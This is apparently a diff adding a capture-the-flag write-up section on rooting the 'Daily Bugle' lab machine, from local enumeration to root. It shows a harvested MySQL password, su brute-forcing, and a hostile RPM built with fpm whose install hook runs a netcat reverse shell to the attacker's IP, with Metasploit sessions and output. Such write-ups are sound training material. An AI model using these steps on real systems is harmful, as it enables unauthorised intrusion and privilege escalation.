@@ -495,4 +495,240 @@ Once I had a stabler shell established, I killed the original shell and quickly 
 
 ![daily bugle restored index](/img/daily_bugle_http_replaced_landing_page.png)
 
+### Local enumeration
+Now that I had a local shell, I decided to 
+
+```
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > getpid 
+Current pid: 4344
+meterpreter > sysinfo 
+Computer     : 10.10.162.223
+OS           : CentOS 7.7.1908 (Linux 3.10.0-1062.el7.x86_64)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > cd /tmp
+meterpreter > upload /root/Desktop/PEASS/linPEAS/linpeas.sh
+[*] uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
+[*] Uploaded -1.00 B of 217.36 KiB (-0.0%): /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
+[*] uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
+meterpreter > shell
+Process 4353 created.
+Channel 2 created.
+./linpeas.sh > 10.10.162.223_enum.txt
+which: no fping in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin)
+
+meterpreter > download 10.10.162.223_enum.txt /root/ctf/
+[*] Downloading: 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
+[*] Downloaded 429.28 KiB of 429.28 KiB (100.0%): 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
+[*] download   : 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
+```
+
+Interestingly the enumeration gave me to pieces of information that were worthwhile, a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file. 
+
+
+```
+[+] Users with console
+jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+```
+
+```
+[+] Searching passwords in config PHP files
+     public $password = 'nv5uz9r3ZEDzVjNu';
+```
+
+I then added this set of credentials to my dailybugle wordlist. In my initial pass I had neglected to do this which lead to a significant rabbithole as I continuously enumerated the host looking for a point of escalation.
+
+```
+root@kali:~/ctf# echo 'nv5uz9r3ZEDzVjNu' >> ./wordlists/dailybugle.txt
+```
+
+### Horizontal local privilege escalation
+Now that I had identified the jjameson user as a potential next target I decided to attempt to escalate locally using the a small bash cript from Carlos Polop that bruteforces `su`. I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transfered this over to the host over a local http webserver.
+
+```
+root@kali:~/ctf# curl -sO https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
+root@kali:~/ctf# cd wordlists/
+root@kali:~/ctf/wordlists# cat dailybugle.txt /usr/share/wordlists/rockyou.txt > combined-wl.txt
+root@kali:~/ctf/wordlists# head combined-wl.txt -n 10
+spiderman123
+nv5uz9r3ZEDzVjNu
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+root@kali:~/ctf/wordlists# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.162.223 - - [27/Nov/2020 22:36:38] "GET /combined-wl.txt HTTP/1.1" 200 -
+```
+
+```
+meterpreter > shell
+Process 21812 created.
+Channel 7 created.
+curl -sO 'http://10.10.182.144/combined-wl.txt'
+./suBF.sh -u jjameson -w combined-wl.txt -t 0.7 -s 0.007
+  [+] Bruteforcing jjameson...
+  You can login as jjameson using password: nv5uz9r3ZEDzVjNu
+```
+
+Executing `suBF` immediately returned a match for the root database credentials. I attempted to ssh from my attack host to the target using the `jjameson` user and was pleased to find a shell.
+
+```
+root@kali:~# ssh jjameson@10.10.162.223
+The authenticity of host '10.10.162.223 (10.10.162.223)' can't be established.
+ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.162.223' (ECDSA) to the list of known hosts.
+jjameson@10.10.162.223's password: 
+Last login: Fri Nov 27 17:37:52 2020
+[jjameson@dailybugle ~]$ ls
+user.txt
+```
+
+Additionally I immediately found the first flag at `/home/jjameson/user.txt`.
+
+### Local enumeration again...
+Now that I had a new low-privilege user I decided to run through enumeration with `linPEAS` again to see if it turned up anything more useful than the previous scan. I uploaded the script to the users home directory and re-executed it.
+
+```
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+
+Interestingly this showed that the user had sudo privileges to execute `yum` which appeared to give the user the ability to install or uninstall anything on the host.
+
+### Exploiting yum for vertical escalation
+With the ability to execute yum on the host as a privileged user I decided to try crafting a hostile RPM that I could use to trigger a reverse shell. To do this I would first need to craft the hostile package.
+
+#### Crafting a hostile RPM
+Referencing [gtfobins](https://gtfobins.github.io/gtfobins/yum/) I decided to craft the RPM using [fpm](https://github.com/jordansissel/fpm). My plan of attack was to pack a netcat reverse shell into the `before-install` trigger of an empty package.
+
+```
+root@kali:~/ctf# EXPLOITDIR=$(mktemp -d)
+root@kali:~/ctf# CMD='nc -e /bin/bash 10.10.182.144 4444'
+root@kali:~/ctf# RPMNAME="exploited"
+root@kali:~/ctf# echo $CMD > $EXPLOITDIR/beforeinstall.sh
+root@kali:~/ctf# fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
+Doing `require 'backports'` is deprecated and will not load any backport in the next major release.
+Require just the needed backports instead, or 'backports/latest'.
+Created package {:path=>"exploited-1.0-1.noarch.rpm"}
+```
+
+With the attack staged I, again, setup a listener in metasploit and then staged up the shell_to_meterpreter to migrate to a stabler shell incase yum timed out.
+
+```
+msf5 post(multi/manage/shell_to_meterpreter) > use exploit/multi/handler 
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set payload generic/shell_reverse_tcp 
+payload => generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.182.144    yes       The listen address (an interface may be specified)
+   LPORT  44444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > run -j
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.182.144:4333 
+msf5 exploit(multi/handler) > search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+msf5 exploit(multi/handler) > use 0
+msf5 post(multi/manage/shell_to_meterpreter) > set lport 4333
+lport => 4333
+msf5 post(multi/manage/shell_to_meterpreter) > set session 3
+session => 3
+```
+
+I then uploaded the poisoned RPM to the host over sftp and started a `yum localinstall`.
+
+```
+sftp> put exploited-1.0-1.noarch.rpm 
+Uploading exploited-1.0-1.noarch.rpm to /home/jjameson/exploited-1.0-1.noarch.rpm
+exploited-1.0-1.noarch.rpm
+```
+
+```
+[jjameson@dailybugle ~]$ sudo yum localinstall -y exploited-1.0-1.noarch.rpm 
+Loaded plugins: fastestmirror
+```
+
+Eventually this 
+
+```
+msf5 post(multi/manage/shell_to_meterpreter) > [*] Command shell session 3 opened (10.10.182.144:4444 -> 10.10.162.223:36016) at 2020-11-27 23:06:30 +0000
+
+msf5 post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4333             yes       Port for payload to connect to.
+   SESSION  3                yes       The session to run this module on.
+
+msf5 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 3
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.182.144:4333 
+[*] Sending stage (980808 bytes) to 10.10.162.223
+[*] Meterpreter session 5 opened (10.10.182.144:4333 -> 10.10.162.223:35216) at 2020-11-27 23:08:04 +0000
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 4
+[*] Starting interaction with 4...
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 4
+[*] Starting interaction with 4...
+
+meterpreter > getuid
+Server username: no-user @ dailybugle (uid=0, gid=0, euid=0, egid=0)
+meterpreter > shell
+Process 4873 created.
+Channel 1 created.
+whoami
+root
+```
+
+Success! With the session upgraded, I confirmed that I had a root account. Finally I found the root flag under `/root/root.txt`
+
 ## Summary
+This challenge really impressed the importance of dilligently taking notes onto me. On my first pass I found but failed to note the root mysql user's password. This lead to me rabbitholing for hours trying to find a local exploit method to move from the apache user to jjameson. It took me walking away and taking stock of everything I knew before I thought to run the known credentials against `jjameson`. The largest lesson I learned is to note everything, especially credentials, as user's might reuse the same credentials many times.
